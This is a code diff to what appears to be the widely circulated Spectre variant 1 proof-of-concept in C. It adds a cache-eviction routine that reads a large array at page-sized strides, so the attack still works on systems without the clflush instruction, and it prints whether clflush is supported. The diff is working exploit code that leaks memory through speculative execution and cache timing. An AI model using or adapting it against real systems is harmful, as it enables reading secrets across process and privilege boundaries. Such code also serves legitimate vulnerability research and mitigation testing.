@@ -60,6 +60,11 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
+#ifdef NOCLFLUSH
+#define CACHE_FLUSH_ITERATIONS 2048
+#define CACHE_FLUSH_STRIDE 4096
+int cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
+#endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -68,6 +73,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
+
+#ifdef NOCLFLUSH
+  int junk2 = 0;
+  int l;
+#endif
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
@@ -80,8 +90,20 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
+#ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
-      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+#else
+      /* Alternative to using clflush to flush the CPU cache */
+      /* Read addresses at 4096-byte intervals out of a large array.
+         Do this around 2000 times, or more depending on CPU cache size. */
+
+      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
+        junk2 = cache_flush_array[l];
+      } 
+#endif
+
+      /* Delay (can also mfence) */
+      for (volatile int z = 0; z < 100; z++) {}
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
@@ -184,6 +206,12 @@ int main(int argc,
   #else
     printf("RDTSCP_NOT_SUPPORTED ");
   #endif
+  #ifndef NOCLFLUSH
+    printf("CLFLUSH_SUPPORTED ");
+  #else
+    printf("CLFLUSH_NOT_SUPPORTED ");
+  #endif
+
   printf("\n");
 
   printf("Reading %d bytes:\n", len);
